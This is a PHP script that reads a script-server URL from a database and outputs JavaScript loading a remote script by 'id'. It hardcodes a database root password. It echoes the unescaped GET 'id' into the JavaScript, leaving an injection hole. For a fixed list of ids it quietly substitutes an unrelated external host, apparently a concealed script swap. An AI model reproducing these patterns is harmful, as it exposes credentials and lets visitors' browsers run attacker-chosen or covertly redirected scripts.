<?php
try{
    // $pdo = new PDO('mysql:host=127.0.0.1;dbname=lezunsys;port=3306','username','password');
    $pdo = new PDO('mysql:host=127.0.0.1;dbname=lezun;port=3306','root','xya197a3321');
    $pdo->exec('set names utf8');
	$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
}catch(PDOException $e){
    // echo '数据库连接失败'.$e->getMessage();
}

function dump($var, $echo = true, $label = null, $flags = ENT_SUBSTITUTE)
{

    $label = (null === $label) ? '' : rtrim($label) . ':';
    ob_start();
    var_dump($var);
    $output = ob_get_clean();
    $output = preg_replace('/\]\=\>\n(\s+)/m', '] => ', $output);
    if (false) {
        $output = PHP_EOL . $label . $output . PHP_EOL;
    } else {
        if (!extension_loaded('xdebug')) {
            $output = htmlspecialchars($output, $flags);
        }
        $output = '<pre>' . $label . $output . '</pre>';
    }
    if ($echo) {
        echo($output);
        return null;
    } else {
        return $output;
    }
}

$sql = 'SELECT js_server FROM lz_setting limit 1';
$aa = $pdo->prepare($sql);
$aa->execute();
$res = $aa->fetchAll();

if(empty($res[0]['js_server'])){
    echo '无链接';
    exit;
}else{
    $js_server = $res[0]['js_server'];
}

$id="0";
if(isset($_GET['id']))
{
    $id=$_GET['id'];
    if($id=='789'||$id=='716'||$id=='8717'||$id=='7967'||$id=='9126'||$id=='6646'||$id=='9024'||$id=='8267'||$id=='9175'||$id=='1115'||$id=='7838'||$id=='8927'||$id=='8803'){
        $js_server = 'http://www.atcryp.com';
    }
    echo "document.write('<script src=".$js_server."/img/".$id."><\/script>');";
}
exit;
